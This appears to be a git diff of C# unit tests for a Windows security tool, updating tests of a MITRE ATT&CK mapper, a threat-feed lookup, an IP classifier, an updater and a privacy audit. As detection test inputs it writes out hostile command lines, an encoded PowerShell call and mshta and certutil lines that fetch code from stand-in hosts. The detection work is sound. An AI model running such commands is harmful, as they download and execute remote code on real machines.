@@ -70,27 +70,27 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
     [Fact]
     public void MitreAttackMapper_CoversCatalogAndMapsAllFindingCategories()
     {
-        var catalog = MitreAttackMapper.GetCatalog();
+        var catalog = MitreAttackMapper.GetAllMappedTechniques();
         Assert.True(catalog.Count >= 20);
         Assert.All(catalog, t =>
         {
             Assert.StartsWith("T", t.TechniqueId);
-            Assert.False(string.IsNullOrWhiteSpace(t.Name));
+            Assert.False(string.IsNullOrWhiteSpace(t.TechniqueName));
             Assert.False(string.IsNullOrWhiteSpace(t.Tactic));
+            Assert.StartsWith("https://attack.mitre.org/techniques/", t.Url);
         });
 
-        Assert.Equal("T1547.001", MitreAttackMapper.MapPersistence("HKCU Run Key").TechniqueId);
-        Assert.Equal("T1053.005", MitreAttackMapper.MapPersistence("Scheduled Task").TechniqueId);
-        Assert.Equal("T1543.003", MitreAttackMapper.MapPersistence("Windows Service").TechniqueId);
-        Assert.Equal("T1546.003", MitreAttackMapper.MapPersistence("WMI Event Subscription").TechniqueId);
+        Assert.Equal("T1547.001", MitreAttackMapper.MapPersistenceCategory("HKCU Run Key").TechniqueId);
+        Assert.Equal("T1053.005", MitreAttackMapper.MapPersistenceCategory("Scheduled Task").TechniqueId);
+        Assert.Equal("T1543.003", MitreAttackMapper.MapPersistenceCategory("Windows Service").TechniqueId);
+        Assert.Equal("T1547.004", MitreAttackMapper.MapPersistenceCategory("Winlogon Helper").TechniqueId);
+        Assert.Equal("T1546.012", MitreAttackMapper.MapPersistenceCategory("IFEO Debugger").TechniqueId);
 
-        Assert.Equal("T1059.001", MitreAttackMapper.MapScript("powershell.exe", "powershell -enc SQBFAFgA").TechniqueId);
-        Assert.Equal("T1218.005", MitreAttackMapper.MapScript("mshta.exe", "mshta http://evil.test/a.hta").TechniqueId);
-        Assert.Equal("T1105", MitreAttackMapper.MapScript("certutil.exe", "certutil -urlcache -f http://a/b").TechniqueId);
-
-        Assert.Equal("T1486", MitreAttackMapper.MapYaraRule("Ransomware_WannaCry_Dropper").TechniqueId);
-        Assert.Equal("T1555", MitreAttackMapper.MapYaraRule("InfoStealer_BrowserCreds").TechniqueId);
-        Assert.Equal("T1574.001", MitreAttackMapper.MapDll(isUnsigned: true, isTempOrUserPath: true).TechniqueId);
+        Assert.Equal("T1059.001", MitreAttackMapper.MapScriptCommand("powershell -enc SQBFAFgA").TechniqueId);
+        Assert.Equal("T1218.005", MitreAttackMapper.MapScriptCommand("mshta http://evil.test/a.hta").TechniqueId);
+        Assert.Equal("T1105", MitreAttackMapper.MapScriptCommand("certutil -urlcache -f http://a/b").TechniqueId);
+        Assert.Equal("T1574.002", MitreAttackMapper.MapDllFinding("Loaded from temp user-writable folder").TechniqueId);
+        Assert.Equal("T1055.001", MitreAttackMapper.MapDllFinding("Unsigned injected DLL").TechniqueId);
 
         var p = new PersistenceEntry { Category = "Scheduled Task" };
         Assert.Equal("T1053.005", p.MitreTechniqueId);
@@ -98,8 +98,8 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
         var s = new SuspiciousScriptEvent { ProcessName = "powershell.exe", CommandLine = "powershell -enc AAA" };
         Assert.Equal("T1059.001", s.MitreTechniqueId);
 
-        var d = new ProcessDllInfo { IsSigned = false, ModulePath = @"C:\Users\alice\AppData\Local\Temp\evil.dll" };
-        Assert.Equal("T1574.001", d.MitreTechniqueId);
+        var d = new ProcessDllInfo { RiskReason = "Unsigned module in temp directory" };
+        Assert.Equal("T1574.002", d.MitreTechniqueId);
     }
 
     // -------------------------------------------------------------------------
@@ -130,45 +130,46 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
         });
 
         using var http = new HttpClient(handler);
-        var svc = new ThreatFeedService(http, _tempDir);
+        var settings = new SettingsService(_tempDir);
+        var svc = new ThreatFeedService(http, settings);
 
         var res = await svc.SyncFeedsAsync();
         Assert.True(res.Success);
         Assert.NotNull(res.Value);
-        Assert.Equal(2, res.Value!.C2IpCount);
+        Assert.Equal(2, res.Value!.BotnetC2IpCount);
         Assert.Equal(2, res.Value.MaliciousDomainCount);
-        Assert.Equal(1, res.Value.MalwareHashCount);
+        Assert.Equal(1, res.Value.MalwareSha256Count);
 
-        var ipHit = svc.Lookup("198.51.100.42");
-        Assert.True(ipHit.IsMatch);
-        Assert.Equal("T1071", ipHit.MitreTechniqueId);
+        var ipHit = svc.CheckIp("198.51.100.42");
+        Assert.NotNull(ipHit);
+        Assert.Equal("T1071", ipHit!.Mitre.TechniqueId);
 
-        var domHit = svc.Lookup("malware-drop.example.org");
-        Assert.True(domHit.IsMatch);
+        var domHit = svc.CheckDomainOrUrl("https://malware-drop.example.org/test");
+        Assert.NotNull(domHit);
+        Assert.Equal("T1105", domHit!.Mitre.TechniqueId);
 
-        var hashHit = svc.Lookup(new string('A', 64));
-        Assert.True(hashHit.IsMatch);
-        Assert.Equal("T1204", hashHit.MitreTechniqueId);
+        var hashHit = svc.CheckSha256(new string('A', 64));
+        Assert.NotNull(hashHit);
+        Assert.Equal("T1204.002", hashHit!.Mitre.TechniqueId);
 
-        var clean = svc.Lookup("8.8.8.8");
-        Assert.False(clean.IsMatch);
+        Assert.Null(svc.CheckIp("8.8.8.8"));
     }
 
     // -------------------------------------------------------------------------
-    //  #3: Live Outbound GeoIP Radar RFC1918 Classifier
+    //  #3: Live Outbound GeoIP Radar Public/Private Classifier
     // -------------------------------------------------------------------------
     [Fact]
     public void OutboundRadarService_ClassifiesPrivateAndPublicIpsCorrectly()
     {
-        Assert.True(OutboundRadarService.IsPrivateIp("127.0.0.1"));
-        Assert.True(OutboundRadarService.IsPrivateIp("10.0.0.5"));
-        Assert.True(OutboundRadarService.IsPrivateIp("192.168.1.20"));
-        Assert.True(OutboundRadarService.IsPrivateIp("172.16.4.2"));
-        Assert.True(OutboundRadarService.IsPrivateIp("::1"));
+        Assert.False(OutboundRadarService.IsPublicIp("127.0.0.1"));
+        Assert.False(OutboundRadarService.IsPublicIp("10.0.0.5"));
+        Assert.False(OutboundRadarService.IsPublicIp("192.168.1.20"));
+        Assert.False(OutboundRadarService.IsPublicIp("172.16.4.2"));
+        Assert.False(OutboundRadarService.IsPublicIp("::1"));
 
-        Assert.False(OutboundRadarService.IsPrivateIp("1.1.1.1"));
-        Assert.False(OutboundRadarService.IsPrivateIp("8.8.8.8"));
-        Assert.False(OutboundRadarService.IsPrivateIp("198.51.100.42"));
+        Assert.True(OutboundRadarService.IsPublicIp("1.1.1.1"));
+        Assert.True(OutboundRadarService.IsPublicIp("8.8.8.8"));
+        Assert.True(OutboundRadarService.IsPublicIp("198.51.100.42"));
     }
 
     // -------------------------------------------------------------------------
@@ -178,7 +179,7 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
     public async Task AppUpdaterService_DetectsNewerGitHubReleaseAndMsixAsset()
     {
         const string json =
-            "{" +
+            "[{" +
             "\"tag_name\":\"v2.5.0\"," +
             "\"name\":\"BECETTI SECURITY v2.5.0 Global Edition\"," +
             "\"html_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/tag/v2.5.0\"," +
@@ -186,10 +187,9 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
             "\"published_at\":\"2026-11-22T20:00:00Z\"," +
             "\"assets\":[{" +
             "\"name\":\"BECETTI-SECURITY_2.5.0.0_x64.msix\"," +
-            "\"browser_download_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/download/v2.5.0/BECETTI-SECURITY_2.5.0.0_x64.msix\"," +
-            "\"size\":94000000" +
+            "\"browser_download_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/download/v2.5.0/BECETTI-SECURITY_2.5.0.0_x64.msix\"" +
             "}]" +
-            "}";
+            "}]";
 
         var handler = new StubHttpHandler(_ => new HttpResponseMessage(HttpStatusCode.OK)
         {
@@ -199,13 +199,13 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
         using var http = new HttpClient(handler);
         var updater = new AppUpdaterService(http);
 
-        var check = await updater.CheckForUpdatesAsync("1.0.0.85");
+        var check = await updater.CheckLatestGitHubReleaseAsync();
         Assert.True(check.Success);
         Assert.NotNull(check.Value);
         Assert.True(check.Value!.IsUpdateAvailable);
-        Assert.Equal("2.5.0", check.Value.LatestVersion);
+        Assert.Equal("2.5.0.0", check.Value.LatestVersion);
         Assert.EndsWith(".msix", check.Value.MsixDownloadUrl);
-        Assert.Equal(94_000_000L, check.Value.MsixSizeBytes);
+        Assert.Equal("BECETTI-SECURITY_2.5.0.0_x64.msix", check.Value.MsixFileName);
     }
 
     // -------------------------------------------------------------------------
@@ -215,12 +215,13 @@ public sealed class GlobalWaveFeaturesTests : IDisposable
     public async Task WindowsPrivacyHardenerService_HandlesAuditCleanlyAcrossPlatforms()
     {
         var svc = new WindowsPrivacyHardenerService();
-        var audit = await svc.AuditAsync();
+        var audit = await svc.AuditPrivacyControlsAsync();
         if (OperatingSystem.IsWindows())
         {
             Assert.True(audit.Success);
             Assert.NotNull(audit.Value);
-            Assert.Equal(6, audit.Value!.Count);
+            Assert.Equal(6, audit.Value!.TotalCount);
+            Assert.Equal(6, audit.Value.Controls.Count);
         }
         else
         {
